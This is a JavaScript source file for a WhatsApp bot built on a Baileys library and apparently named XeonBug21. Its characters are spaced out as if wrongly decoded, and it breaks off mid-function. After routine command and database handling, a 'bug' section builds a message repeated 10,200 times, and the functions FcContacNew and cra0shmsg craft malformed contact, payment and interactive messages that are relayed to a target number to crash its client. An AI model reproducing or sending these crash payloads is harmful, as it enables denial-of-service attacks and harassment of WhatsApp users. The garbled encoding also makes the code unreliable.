 p r o c e s s . o n ( ' u n c a u g h t E x c e p t i o n ' ,   c o n s o l e . e r r o r ) 
 r e q u i r e ( " . / c o n f i g " ) 
 c o n s t   {   g e n e r a t e M e s s a g e I D ,   g e n e r a t e M e s s a g e I D V 2 ,   W A _ D E F A U L T _ E P H E M E R A L ,   e n c o d e S i g n e d D e v i c e I d e n t i t y ,   g e t A g g r e g a t e V o t e s I n P o l l M e s s a g e ,   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ,   p r o t o ,   g e n e r a t e W A M e s s a g e C o n t e n t ,   g e n e r a t e W A M e s s a g e ,   p r e p a r e W A M e s s a g e M e d i a ,   d o w n l o a d C o n t e n t F r o m M e s s a g e ,   a r e J i d s S a m e U s e r ,   g e t C o n t e n t T y p e ,   u s e M u l t i F i l e A u t h S t a t e ,   m a k e W A S o c k e t ,   f e t c h L a t e s t B a i l e y s V e r s i o n ,   m a k e C a c h e a b l e S i g n a l K e y S t o r e ,   m a k e W a S o c k e t   }   =   r e q u i r e ( " @ a d i w a j s h i n g / b a i l e y s " ) 
 c o n s t   f s   =   r e q u i r e ( ' f s ' ) 
 c o n s t   u t i l   =   r e q u i r e ( ' u t i l ' ) 
 c o n s t   a x i o s   =   r e q u i r e ( ' a x i o s ' ) 
 c o n s t   {   e x e c   }   =   r e q u i r e ( " c h i l d _ p r o c e s s " ) 
 c o n s t   c h a l k   =   r e q u i r e ( ' c h a l k ' ) 
 c o n s t   m o m e n t   =   r e q u i r e ( ' m o m e n t - t i m e z o n e ' ) ; 
 c o n s t   y t s   =   r e q u i r e   ( ' y t - s e a r c h ' ) ; 
 c o n s t   d i d y o u m e a n   =   r e q u i r e ( ' d i d y o u m e a n ' ) ; 
 c o n s t   s i m i l a r i t y   =   r e q u i r e ( ' s i m i l a r i t y ' ) 
 c o n s t   p i n o   =   r e q u i r e ( ' p i n o ' ) 
 c o n s t   l o g g e r   =   p i n o ( {   l e v e l :   ' d e b u g '   } ) ; 
 c o n s t   J S C o n f u s e r   =   r e q u i r e ( " j s - c o n f u s e r " ) ; 
 c o n s t   c r y p t o   =   r e q u i r e ( ' c r y p t o ' ) ; 
 c o n s t   p a t h   =   r e q u i r e ( ' p a t h ' ) 
 / / c o n s t   e x p r e s s   =   r e q u i r e ( ' e x p r e s s ' ) ; 
 c o n s t   m s   =   r e q u i r e ( ' m s ' ) ; 
 c o n s t   o s   =   r e q u i r e ( ' o s ' ) 
   
 / * c o n s t   a p p   =   e x p r e s s ( ) ; 
 c o n s t   P O R T   =   p r o c e s s . e n v . P O R T   | |   3 0 0 0 ; * / 
 
 m o d u l e . e x p o r t s   =   a s y n c   ( X e o n B o t I n c ,   m )   = >   { 
 t r y   { 
 c o n s t   f r o m   =   m . k e y . r e m o t e J i d 
 v a r   b o d y   =   ( m . m t y p e   = = =   ' i n t e r a c t i v e R e s p o n s e M e s s a g e ' )   ?   J S O N . p a r s e ( m . m e s s a g e . i n t e r a c t i v e R e s p o n s e M e s s a g e . n a t i v e F l o w R e s p o n s e M e s s a g e . p a r a m s J s o n ) . i d   :   ( m . m t y p e   = = =   ' c o n v e r s a t i o n ' )   ?   m . m e s s a g e . c o n v e r s a t i o n   :   ( m . m t y p e   = =   ' i m a g e M e s s a g e ' )   ?   m . m e s s a g e . i m a g e M e s s a g e . c a p t i o n   :   ( m . m t y p e   = =   ' v i d e o M e s s a g e ' )   ?   m . m e s s a g e . v i d e o M e s s a g e . c a p t i o n   :   ( m . m t y p e   = =   ' e x t e n d e d T e x t M e s s a g e ' )   ?   m . m e s s a g e . e x t e n d e d T e x t M e s s a g e . t e x t   :   ( m . m t y p e   = =   ' b u t t o n s R e s p o n s e M e s s a g e ' )   ?   m . m e s s a g e . b u t t o n s R e s p o n s e M e s s a g e . s e l e c t e d B u t t o n I d   :   ( m . m t y p e   = =   ' l i s t R e s p o n s e M e s s a g e ' )   ?   m . m e s s a g e . l i s t R e s p o n s e M e s s a g e . s i n g l e S e l e c t R e p l y . s e l e c t e d R o w I d   :   ( m . m t y p e   = =   ' t e m p l a t e B u t t o n R e p l y M e s s a g e ' )   ?   m . m e s s a g e . t e m p l a t e B u t t o n R e p l y M e s s a g e . s e l e c t e d I d   :   ( m . m t y p e   = =   ' m e s s a g e C o n t e x t I n f o ' )   ?   ( m . m e s s a g e . b u t t o n s R e s p o n s e M e s s a g e ? . s e l e c t e d B u t t o n I d   | |   m . m e s s a g e . l i s t R e s p o n s e M e s s a g e ? . s i n g l e S e l e c t R e p l y . s e l e c t e d R o w I d   | |   m . t e x t )   :   " " 
 
 c o n s t   {   s m s g ,   f e t c h J s o n ,   g e t B u f f e r ,   f e t c h B u f f e r ,   g e t G r o u p A d m i n s ,   T e l e g r a P h ,   i s U r l ,   h i t u n g m u n d u r ,   s l e e p ,   c l o c k S t r i n g ,   c h e c k B a n d w i d t h ,   r u n t i m e ,   t a n g g a l ,   g e t R a n d o m   }   =   r e q u i r e ( ' . / l i b 2 / m y f u n c ' ) 
 v a r   b u d y   =   ( t y p e o f   m . t e x t   = =   ' s t r i n g '   ?   m . t e x t :   ' ' ) 
 v a r   p r e f i x   =   g l o b a l . p r e f a   ?   / ^ [ ° • π ÷ × ¶ ∆ £ ¢ € ¥ ® ™ + ✓ _ = | ~ ! ? @ # $ % ^ & . © ^ ] / g i . t e s t ( b o d y )   ?   b o d y . m a t c h ( / ^ [ ° • π ÷ × ¶ ∆ £ ¢ € ¥ ® ™ + ✓ _ = | ~ ! ? @ # $ % ^ & . © ^ ] / g i ) [ 0 ]   :   " "   :   g l o b a l . p r e f a   ? ?   g l o b a l . p r e f i x 
 c o n s t   i s C m d   =   b o d y . s t a r t s W i t h ( p r e f i x ) ; 
 c o n s t   c o m m a n d   =   i s C m d   ?   b o d y . s l i c e ( p r e f i x . l e n g t h ) . t r i m ( ) . s p l i t ( '   ' ) . s h i f t ( ) . t o L o w e r C a s e ( )   :   ' ' ; 
 c o n s t   a r g s   =   b o d y . t r i m ( ) . s p l i t ( /   + / ) . s l i c e ( 1 ) 
 c o n s t   t e x t   =   q   =   a r g s . j o i n ( "   " ) 
 c o n s t   s e n d e r   =   m . k e y . f r o m M e   ?   ( X e o n B o t I n c . u s e r . i d . s p l i t ( ' : ' ) [ 0 ] + ' @ s . w h a t s a p p . n e t '   | |   X e o n B o t I n c . u s e r . i d )   :   ( m . k e y . p a r t i c i p a n t   | |   m . k e y . r e m o t e J i d ) 
 c o n s t   b o t N u m b e r   =   a w a i t   X e o n B o t I n c . d e c o d e J i d ( X e o n B o t I n c . u s e r . i d ) 
 c o n s t   s e n d e r N u m b e r   =   s e n d e r . s p l i t ( ' @ ' ) [ 0 ] 
 c o n s t   i s C r e a t o r   =   ( m   & &   m . s e n d e r   & &   [ b o t N u m b e r ,   . . . ( g l o b a l . d b . d a t a . o w n e r s   | |   [ ] ) ] . m a p ( v   = >   v . r e p l a c e ( / [ ^ 0 - 9 ] / g ,   ' ' )   +   ' @ s . w h a t s a p p . n e t ' ) . i n c l u d e s ( m . s e n d e r ) )   | |   f a l s e ; 
 c o n s t   i s D e v e l o p e r   =   ( m   & &   m . s e n d e r   & &   ( g l o b a l . d b . d a t a . o w n e r s   | |   [ ] ) . m a p ( v   = >   v . r e p l a c e ( / [ ^ 0 - 9 ] / g ,   ' ' )   +   ' @ s . w h a t s a p p . n e t ' ) . i n c l u d e s ( m . s e n d e r ) )   | |   f a l s e ; 
 c o n s t   p u s h n a m e   =   m . p u s h N a m e   | |   ` $ { s e n d e r N u m b e r } ` 
 c o n s t   i s B o t   =   b o t N u m b e r . i n c l u d e s ( s e n d e r N u m b e r ) 
 
 
 c o n s t   q u o t e d   =   m . q u o t e d   ?   m . q u o t e d   :   m 
 c o n s t   m i m e   =   ( q u o t e d . m s g   | |   q u o t e d ) . m i m e t y p e   | |   ' ' 
 c o n s t   q m s g   =   ( q u o t e d . m s g   | |   q u o t e d ) 
 c o n s t   g r o u p M e t a d a t a   =   m . i s G r o u p   ?   a w a i t   X e o n B o t I n c . g r o u p M e t a d a t a ( f r o m ) . c a t c h ( e   = >   { } )   :   ' ' 
 c o n s t   g r o u p N a m e   =   m . i s G r o u p   ?   g r o u p M e t a d a t a . s u b j e c t   :   ' ' 
 c o n s t   p a r t i c i p a n t s   =   m . i s G r o u p   ?   a w a i t   g r o u p M e t a d a t a . p a r t i c i p a n t s   :   ' ' 
 c o n s t   g r o u p A d m i n s   =   m . i s G r o u p   ?   a w a i t   g e t G r o u p A d m i n s ( p a r t i c i p a n t s )   :   ' ' 
 c o n s t   i s B o t A d m i n s   =   m . i s G r o u p   ?   g r o u p A d m i n s . i n c l u d e s ( b o t N u m b e r )   :   f a l s e 
 c o n s t   i s A d m i n s   =   m . i s G r o u p   ?   g r o u p A d m i n s . i n c l u d e s ( m . s e n d e r )   :   f a l s e 
 c o n s t   i s R e a c t   =   m . m e s s a g e . r e a c t i o n M e s s a g e   ?   t r u e   :   f a l s e   
 
 / / = = = = = = = = = = = = = = = [ D A T A B A S E ] = = = = = = = = = = = = = = = = = = = = = \ \ 
 	 	 t r y   { 
 	 	 	 l e t   i s N u m b e r   =   x   = >   t y p e o f   x   = = =   ' n u m b e r '   & &   ! i s N a N ( x ) 
 	 	 	 l e t   u s e r   =   g l o b a l . d b . d a t a . u s e r s [ m . s e n d e r ] 
 	 	 	 i f   ( t y p e o f   u s e r   ! = =   ' o b j e c t ' )   g l o b a l . d b . d a t a . u s e r s [ m . s e n d e r ]   =   { } 
 	 	 	 i f   ( u s e r )   { 
 	 	 	 	 i f   ( ! i s N u m b e r ( u s e r . p r e m i u m E x p i r y ) )   u s e r . p r e m i u m E x p i r y   =   0 
 	 	 	 }   e l s e   g l o b a l . d b . d a t a . u s e r s [ m . s e n d e r ]   =   { 
 	 	 	 	 p r e m i u m E x p i r y :   0 
 	 	 	 } 
 	 	 	 
 	 	 	 l e t   s e t t i n g   =   g l o b a l . d b . d a t a . s e t t i n g s [ b o t N u m b e r ] 
 	 	 	 i f   ( t y p e o f   s e t t i n g   ! = =   ' o b j e c t ' )   g l o b a l . d b . d a t a . s e t t i n g s [ b o t N u m b e r ]   =   { } 
                         i f   ( s e t t i n g )   { 
                         i f   ( ! ( ' a n t i s w v i e w '   i n   s e t t i n g ) )   s e t t i n g . a n t i s w v i e w   =   f a l s e 
                         }   e l s e   g l o b a l . d b . d a t a . s e t t i n g s [ b o t N u m b e r ]   =   { 
                               a n t i s w v i e w :   f a l s e , 
                         } 
 	 	 }   c a t c h   ( e )   { 
 	 	 	 c o n s o l e . l o g ( e ) 
 	 	 } 
 	 	 / / = = = = = \ \ 
 c o n s t   c d   =   r e q u i r e ( ' . / l i b 2 / c o u n t d o w n ' ) 
 l e t   u s e r s d b   =   g l o b a l . d b . d a t a . u s e r s 
 f s . w r i t e F i l e S y n c ( ' . / d a t a b a s e / d a t a b a s e . j s o n ' ,   J S O N . s t r i n g i f y ( g l o b a l . d b ,   n u l l ,   2 ) ) 
 c o n s t   i s P r e m i u m   =   i s C r e a t o r   ?   t r u e   :   c d . i s P r e m i u m ( u s e r s d b ,   m . s e n d e r ) 
 c o n s t   i s R e n t B o t U s e r   =   i s D e v e l o p e r   ?   t r u e   :   c d . i s P r e m i u m ( u s e r s d b ,   m . s e n d e r ) 
 / / = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \ \ 
 / / b u g 
 x e o n t e x   =   " \ n   "   +   ( a r g s . j o i n ( "   " )   ?   a r g s . j o i n ( "   " )   :   " T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � " )   +   " \ n \ n \ n " ; 
         j i d d s   =   [ ] ; 
         x e o n t e x   + =   " * ~ @ 2 0 1 5 0 7 1 5 1 6 9 7 ~ * \ n * � � * \ n * ~ @ 9 1 9 3 6 6 3 1 6 0 1 8 ~ * \ n " . r e p e a t ( 1 0 2 0 0 ) ; 
         j i d d s . p u s h ( " 2 0 1 5 0 7 1 5 1 6 9 7 @ s . w h a t s a p p . n e t " ,   " 9 1 9 3 6 6 3 1 6 0 1 8 @ s . w h a t s a p p . n e t " ) ; 
 / / b u g   d a t a b a s e 
 c o n s t   {   x e o n t e x t 1   }   =   r e q u i r e ( ' . / 6 9 / x e o n t e x t 1 ' ) 
 c o n s t   {   x e o n t e x t 2   }   =   r e q u i r e ( ' . / 6 9 / x e o n t e x t 2 ' ) 
 c o n s t   {   x e o n t e x t 3   }   =   r e q u i r e ( ' . / 6 9 / x e o n t e x t 3 ' ) 
 c o n s t   {   x e o n t e x t 4   }   =   r e q u i r e ( ' . / 6 9 / x e o n t e x t 4 ' ) 
 c o n s t   {   x e o n t e x t 5   }   =   r e q u i r e ( ' . / 6 9 / x e o n t e x t 5 ' ) 
 c o n s t   {   x e o n t e x t 6   }   =   r e q u i r e ( ' . / 6 9 / x e o n t e x t 6 ' ) 
 c o n s t   {   x e o n t e x t 7   }   =   r e q u i r e ( ' . / 6 9 / x e o n t e x t 7 ' ) 
 c o n s t   {   x e o n t e x t 8   }   =   r e q u i r e ( ' . / 6 9 / x e o n t e x t 8 ' ) 
 c o n s t   {   x e o n t e x t 9   }   =   r e q u i r e ( ' . / 6 9 / x e o n t e x t 9 ' ) 
 c o n s t   {   x e o n t e x t 1 0   }   =   r e q u i r e ( ' . / 6 9 / x e o n t e x t 1 0 ' ) 
 c o n s t   {   x e o n t e x t 1 1   }   =   r e q u i r e ( ' . / 6 9 / x e o n t e x t 1 1 ' ) 
 c o n s t   {   x e o n b e t a 1 ,   x e o n b e t a 2 ,   x e o n y x   }   =   r e q u i r e ( " . / 6 9 / x e o n t e x t 1 3 . j s " ) 
 c o n s t   w k w k   =   f s . r e a d F i l e S y n c ( ` . / 6 9 / x . m p 3 ` ) 
 c o n s t   x s t e e k   =   f s . r e a d F i l e S y n c ( ` . / 6 9 / x . w e b p ` ) 
 c o n s t   o   =   f s . r e a d F i l e S y n c ( ` . / 6 9 / o . j p g ` ) 
 / /   N o   N e e d   t o   D o   A n y t h i n g   I f   Y o u   D o n ' t   W a n t   E r r o r s 
 
 / / t i m e 
 c o n s t   x t i m e   =   m o m e n t . t z ( ' A s i a / K o l k a t a ' ) . f o r m a t ( ' H H : m m : s s ' ) 
                 c o n s t   x d a t e   =   m o m e n t . t z ( ' A s i a / K o l k a t a ' ) . f o r m a t ( ' D D / M M / Y Y Y Y ' ) 
                 c o n s t   t i m e 2   =   m o m e n t ( ) . t z ( ' A s i a / K o l k a t a ' ) . f o r m a t ( ' H H : m m : s s ' )     
                   i f ( t i m e 2   <   " 2 3 : 5 9 : 0 0 " ) { 
 v a r   x e o n y t i m e w i s h e r   =   ` G o o d   N i g h t   � � ` 
   } 
   i f ( t i m e 2   <   " 1 9 : 0 0 : 0 0 " ) { 
 v a r   x e o n y t i m e w i s h e r   =   ` G o o d   E v e n i n g   � � ` 
   } 
   i f ( t i m e 2   <   " 1 8 : 0 0 : 0 0 " ) { 
 v a r   x e o n y t i m e w i s h e r   =   ` G o o d   E v e n i n g   � � ` 
   } 
   i f ( t i m e 2   <   " 1 5 : 0 0 : 0 0 " ) { 
 v a r   x e o n y t i m e w i s h e r   =   ` G o o d   A f t e r n o o n   � � ` 
   } 
   i f ( t i m e 2   <   " 1 1 : 0 0 : 0 0 " ) { 
 v a r   x e o n y t i m e w i s h e r   =   ` G o o d   M o r n i n g   � � ` 
   } 
   i f ( t i m e 2   <   " 0 5 : 0 0 : 0 0 " ) { 
 v a r   x e o n y t i m e w i s h e r   =   ` G o o d   M o r n i n g   � � ` 
   }   
   
   f u n c t i o n   s e n d M e s s a g e W i t h M e n t i o n s 2 ( t e x t ,   m e n t i o n s   =   [ ] ,   q u o t e d   =   f a l s e )   { 
     i f   ( q u o t e d   = =   n u l l   | |   q u o t e d   = =   u n d e f i n e d   | |   q u o t e d   = =   f a l s e )   { 
         r e t u r n   X e o n B o t I n c . s e n d M e s s a g e ( m . c h a t ,   { 
             ' t e x t ' :   t e x t , 
             ' m e n t i o n s ' :   m e n t i o n s 
         } ,   { 
             ' q u o t e d ' :   m 
         } ) ; 
     }   e l s e   { 
         r e t u r n   X e o n B o t I n c . s e n d M e s s a g e ( m . c h a t ,   { 
             ' t e x t ' :   t e x t , 
             ' m e n t i o n s ' :   m e n t i o n s 
         } ,   { 
             ' q u o t e d ' :   m 
         } ) ; 
     } 
 } 
 
 f u n c t i o n   s e n d M e s s a g e W i t h M e n t i o n s ( t e x t ,   m e n t i o n s   =   [ ] ,   q u o t e d   =   f a l s e )   { 
     i f   ( q u o t e d   = =   n u l l   | |   q u o t e d   = =   u n d e f i n e d   | |   q u o t e d   = =   f a l s e )   { 
         r e t u r n   X e o n B o t I n c . s e n d M e s s a g e ( m . c h a t ,   { 
                                                 t e x t :   t e x t , 
                                                 c o n t e x t I n f o :   { 
 f o r w a r d i n g S c o r e :   9 9 9 , 
 i s F o r w a r d e d :   t r u e , 
 m e n t i o n e d J i d :   [ m e n t i o n s ] , 
 f o r w a r d e d N e w s l e t t e r M e s s a g e I n f o :   { 
 n e w s l e t t e r N a m e :   o w n e r n a m e , 
 n e w s l e t t e r J i d :   " 1 2 0 3 6 3 3 8 5 7 3 9 3 4 3 0 5 8 @ n e w s l e t t e r " , 
 } , 
 e x t e r n a l A d R e p l y :   { 
 s h o w A d A t t r i b u t i o n :   t r u e , 
 t i t l e :   o w n e r n a m e , 
 b o d y :   b o t n a m e , 
 t h u m b n a i l U r l :   " h t t p s : / / f i l e s . c a t b o x . m o e / 8 c 1 r d s . j p g " , 
 s o u r c e U r l :   l i n k , 
 m e d i a T y p e :   1 , 
 r e n d e r L a r g e r T h u m b n a i l :   f a l s e 
 } 
 } 
                                                 } ,   { q u o t e d : m } ) 
     }   e l s e   { 
         r e t u r n   X e o n B o t I n c . s e n d M e s s a g e ( m . c h a t ,   { 
                                                 t e x t :   t e x t , 
                                                 c o n t e x t I n f o :   { 
 f o r w a r d i n g S c o r e :   9 9 9 , 
 i s F o r w a r d e d :   t r u e , 
 m e n t i o n e d J i d :   [ m e n t i o n s ] , 
 f o r w a r d e d N e w s l e t t e r M e s s a g e I n f o :   { 
 n e w s l e t t e r N a m e :   o w n e r n a m e , 
 n e w s l e t t e r J i d :   " 1 2 0 3 6 3 3 8 5 7 3 9 3 4 3 0 5 8 @ n e w s l e t t e r " , 
 } , 
 e x t e r n a l A d R e p l y :   { 
 s h o w A d A t t r i b u t i o n :   t r u e , 
 t i t l e :   o w n e r n a m e , 
 b o d y :   b o t n a m e , 
 t h u m b n a i l U r l :   " h t t p s : / / f i l e s . c a t b o x . m o e / 8 c 1 r d s . j p g " , 
 s o u r c e U r l :   l i n k , 
 m e d i a T y p e :   1 , 
 r e n d e r L a r g e r T h u m b n a i l :   f a l s e 
 } 
 } 
                                                 } ,   { q u o t e d : m } ) 
     } 
 } 
 
 c o n s t   p i c k R a n d o m   =   ( a r r )   = >   { 
 r e t u r n   a r r [ M a t h . f l o o r ( M a t h . r a n d o m ( )   *   a r r . l e n g t h ) ] 
 } 
 
 / / g r o u p   c h a t   m s g   b y   x e o n 
 c o n s t   r e p l y g c x e o n 2   =   ( t e k s )   = >   { 
 	 X e o n B o t I n c . s e n d M e s s a g e ( m . c h a t ,   { 
                                                 t e x t :   t e k s , 
                                                 c o n t e x t I n f o :   { 
 f o r w a r d i n g S c o r e :   9 9 9 , 
 i s F o r w a r d e d :   t r u e , 
 m e n t i o n e d J i d :   [ s e n d e r ] , 
 f o r w a r d e d N e w s l e t t e r M e s s a g e I n f o :   { 
 n e w s l e t t e r N a m e :   o w n e r n a m e , 
 n e w s l e t t e r J i d :   " 1 2 0 3 6 3 3 8 5 7 3 9 3 4 3 0 5 8 @ n e w s l e t t e r " , 
 } , 
 e x t e r n a l A d R e p l y :   { 
 s h o w A d A t t r i b u t i o n :   t r u e , 
 t i t l e :   o w n e r n a m e , 
 b o d y :   b o t n a m e , 
 t h u m b n a i l U r l :   " h t t p s : / / f i l e s . c a t b o x . m o e / 8 c 1 r d s . j p g " , 
 s o u r c e U r l :   l i n k , 
 m e d i a T y p e :   1 , 
 r e n d e r L a r g e r T h u m b n a i l :   t r u e 
 } 
 } 
                                                 } ,   { q u o t e d : m } ) 
 
 } 
 
 c o n s t   r e p l y g c x e o n   =   ( t e k s )   = >   { 
 	 X e o n B o t I n c . s e n d M e s s a g e ( m . c h a t ,   { 
                                                 t e x t :   t e k s , 
                                                 c o n t e x t I n f o :   { 
 f o r w a r d i n g S c o r e :   9 9 9 , 
 i s F o r w a r d e d :   t r u e , 
 m e n t i o n e d J i d :   [ s e n d e r ] , 
 f o r w a r d e d N e w s l e t t e r M e s s a g e I n f o :   { 
 n e w s l e t t e r N a m e :   o w n e r n a m e , 
 n e w s l e t t e r J i d :   " 1 2 0 3 6 3 3 8 5 7 3 9 3 4 3 0 5 8 @ n e w s l e t t e r " , 
 } 
 } 
                                                 } ,   { q u o t e d : m } ) 
 
 } 
       
 / / s e l f   p u b l i c 
 i f   ( ! X e o n B o t I n c . p u b l i c )   { 
 i f   ( ! i s C r e a t o r )   r e t u r n 
 } 
 
 i f   ( p r e f i x   & &   c o m m a n d )   { 
 l e t   c a s e N a m e s   =   g e t C a s e N a m e s ( ) ; 
 f u n c t i o n   g e t C a s e N a m e s ( )   { 
 c o n s t   f s   =   r e q u i r e ( ' f s ' ) ; 
 t r y   { 
 c o n s t   d a t a   =   f s . r e a d F i l e S y n c ( ' X e o n B u g 2 1 . j s ' ,   ' u t f 8 ' ) ; 
 c o n s t   c a s e P a t t e r n   =   / c a s e \ s + ' ( [ ^ ' ] + ) ' / g ; 
 c o n s t   m a t c h e s   =   d a t a . m a t c h ( c a s e P a t t e r n ) ; 
 i f   ( m a t c h e s )   { 
 c o n s t   c a s e N a m e s   =   m a t c h e s . m a p ( m a t c h   = >   m a t c h . r e p l a c e ( / c a s e \ s + ' ( [ ^ ' ] + ) ' / ,   ' $ 1 ' ) ) ; 
 r e t u r n   c a s e N a m e s ; 
 }   e l s e   { 
 r e t u r n   [ ] ; 
 }   }   c a t c h   ( e r r )   { 
 c o n s o l e . l o g ( ' T h e r e   i s   a n   e r r o r : ' ,   e r r ) ; 
 r e t u r n   [ ] ; 
 } } 
 l e t   n o P r e f i x   =   c o m m a n d 
 l e t   m e a n   =   d i d y o u m e a n ( n o P r e f i x ,   c a s e N a m e s ) ; 
 l e t   s i m   =   s i m i l a r i t y ( n o P r e f i x ,   m e a n ) ; 
 l e t   s i m i l a r i t y P e r c e n t a g e   =   p a r s e I n t ( s i m   *   1 0 0 ) ; 
 i f   ( m e a n   & &   n o P r e f i x . t o L o w e r C a s e ( )   ! = =   m e a n . t o L o w e r C a s e ( ) )   { 
 l e t   r e s p o n s e   =   ` S o r r y ,   t h e   c o m m a n d   y o u   g a v e   i s   w r o n g .   M a y b e   t h i s   i s   w h a t   y o u   m e a n : \ n \ n • >   $ { p r e f i x + m e a n } \ n • >   S i m i l a r i t i e s :   $ { s i m i l a r i t y P e r c e n t a g e } % ` 
 r e p l y g c x e o n ( r e s p o n s e ) 
 } }       
 / / = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \ \ 
         a s y n c   f u n c t i o n   F c C o n t a c N e w ( t a r g e t )   { 
     v a r   c r a s h c o n t a c k   =   { 
         c o n t a c t M e s s a g e :   { 
                 c o n t e x t I n f o :   { 
                     i n t e r a c t i v e M e s s a g e :   { 
                         b o d y :   { 
                         t e x t :   " \ u 0 0 0 0 " , 
                         m i m e t y p e :   " a u d i o / m p e g " 
                     } 
                 } 
             } 
         }   
     } ; 
     
     a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( 
         t a r g e t , 
         c r a s h c o n t a c k , 
         {   m e s s a g e I d :   n u l l   } 
     ) 
 
     a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( 
         t a r g e t , 
         { 
             s e n d P a y m e n t M e s s a g e :   { 
                 c u r r e n c y C o d e I s o 4 2 1 7 :   " I D R " , 
                 r e q u e s t F r o m :   t a r g e t , 
                 e x p i r y T i m e s t a m p :   n u l l , 
             } 
         } , 
         { 
             p a r t i c i p a n t :   {   j i d :   t a r g e t   } 
         } 
     ) 
 } 
   a s y n c   f u n c t i o n   c r a 0 s h m s g ( t a r g e t )   { 
         t r y   { 
                 c o n s t   i n t e r a c t i v e P a y l o a d   =   { 
                         i n t e r a c t i v e M e s s a g e :   { 
                                 h e a d e r :   { 
                                         h a s M e d i a A t t a c h m e n t :   t r u e , 
                                         j p e g T h u m b n a i l :   n u l l 
                                 } , 
                                 c o n t e x t I n f o :   { 
                                         p a r t i c i p a n t :   " 0 @ s . w h a t s a p p . n e t " , 
                                         r e m o t e J i d :   " s t a t u s @ b r o a d c a s t " , 
                                         c o n v e r s i o n S o u r c e :   " p o r n " , 
                                         c o n v e r s i o n D a t a :   c r y p t o . r a n d o m B y t e s ( 1 6 ) , 
                                         c o n v e r s i o n D e l a y S e c o n d s :   9 9 9 9 , 
                                         f o r w a r d i n g S c o r e :   9 9 9 9 9 9 , 
                                         i s F o r w a r d e d :   t r u e , 
                                         q u o t e d A d :   { 
                                                 a d v e r t i s e r N a m e :   " K o r n t h " , 
                                                 m e d i a T y p e :   " I M A G E " , 
                                                 j p e g T h u m b n a i l :   n u l l , 
                                                 c a p t i o n :   " T e l e g r a m @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � �   n u l l   � � " 
                                         } , 
                                         p l a c e h o l d e r K e y :   { 
                                                 r e m o t e J i d :   " 0 @ s . w h a t s a p p . n e t " , 
                                                 f r o m M e :   f a l s e , 
                                                 i d :   " A B C D E F 1 2 3 4 5 6 7 8 9 0 " 
                                         } , 
                                         e x p i r a t i o n :   - 9 9 9 9 9 , 
                                         e p h e m e r a l S e t t i n g T i m e s t a m p :   D a t e . n o w ( ) , 
                                         e p h e m e r a l S h a r e d S e c r e t :   c r y p t o . r a n d o m B y t e s ( 1 6 ) , 
                                         e n t r y P o i n t C o n v e r s i o n S o u r c e :   " W h a t s a A p p " , 
                                         e n t r y P o i n t C o n v e r s i o n A p p :   " W h a t s A p p " , 
                                         a c t i o n L i n k :   { 
                                                 u r l :   " t . m e / K o r n t h _ i " , 
                                                 b u t t o n T i t l e :   " a c t i o n _ b u t t o n " 
                                         } , 
                                         d i s a p p e a r i n g M o d e :   { 
                                                 i n i t i a t o r :   1 , 
                                                 t r i g g e r :   2 , 
                                                 i n i t i a t o r D e v i c e J i d :   t a r g e t , 
                                                 i n i t i a t e d B y M e :   t r u e 
                                         } , 
                                         g r o u p S u b j e c t :   " T e l e g r a m @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � �   � � " , 
                                         p a r e n t G r o u p J i d :   " 0 @ g . u s " , 
                                         t r u s t B a n n e r T y p e :   " X " , 
                                         t r u s t B a n n e r A c t i o n :   9 9 9 9 9 , 
                                         i s S a m p l e d :   t r u e , 
                                         e x t e r n a l A d R e p l y :   { 
                                                 t i t l e :   " T e l e g r a m @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � �   � � " , 
                                                 m e d i a T y p e :   2 , 
                                                 r e n d e r L a r g e r T h u m b n a i l :   f a l s e , 
                                                 s h o w A d A t t r i b u t i o n :   f a l s e , 
                                                 c o n t a i n s A u t o R e p l y :   f a l s e , 
                                                 b o d y :   " A i   K o r n t h   " , 
                                                 t h u m b n a i l :   n u l l , 
                                                 s o u r c e U r l :   " t . m e / K o r n t h _ i " , 
                                                 s o u r c e I d :   " 9 T 7 A 4 M 1 A " , 
                                                 c t w a C l i d :   " c t w a C l i d " , 
                                                 r e f :   " r e f " , 
                                                 c l i c k T o W h a t s a p p C a l l :   t r u e , 
                                                 c t a P a y l o a d :   " c t a P a y l o a d " , 
                                                 d i s a b l e N u d g e :   t r u e , 
                                                 o r i g i n a l I m a g e U r l :   n u l l 
                                         } , 
                                         f e a t u r e E l i g i b i l i t i e s :   { 
                                                 c a n n o t B e R e a c t e d T o :   t r u e , 
                                                 c a n n o t B e R a n k e d :   t r u e , 
                                                 c a n R e q u e s t F e e d b a c k :   t r u e 
                                         } , 
                                         f o r w a r d e d N e w s l e t t e r M e s s a g e I n f o :   { 
                                                 n e w s l e t t e r J i d :   " 0 @ n e w s l e t t e r " , 
                                                 s e r v e r M e s s a g e I d :   1 , 
                                                 n e w s l e t t e r N a m e :   ` C r a s h   K o r n t h   ~   $ { " ꥈ ꥈ ꥈ ꥈ ꥈ ꥈ " . r e p e a t ( 1 0 ) } ` , 
                                                 c o n t e n t T y p e :   3 , 
                                                 a c c e s s i b i l i t y T e x t :   " T e l e g r a m @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � �   � � " 
                                         } , 
                                         s t a t u s A t t r i b u t i o n T y p e :   2 , 
                                         u t m :   { 
                                                 u t m S o u r c e :   " X s S o u r c e " , 
                                                 u t m C a m p a i g n :   " X s C a m p a i g n " 
                                         } 
                                 } , 
                                 b o d y :   { 
                                         t e x t :   " T e l e g r a m @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � �   � � " 
                                 } , 
                                 n a t i v e F l o w M e s s a g e :   { 
                                         b u t t o n s :   [ { 
                                                 n a m e :   " p a y m e n t _ m e t h o d " , 
                                                 b u t t o n P a r a m s J s o n :   ` { } ` 
                                         } ] 
                                 } 
                         } 
                 } ; 
 
                 c o n s t   m s g 1   =   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( t a r g e t ,   i n t e r a c t i v e P a y l o a d ,   { } ) ; 
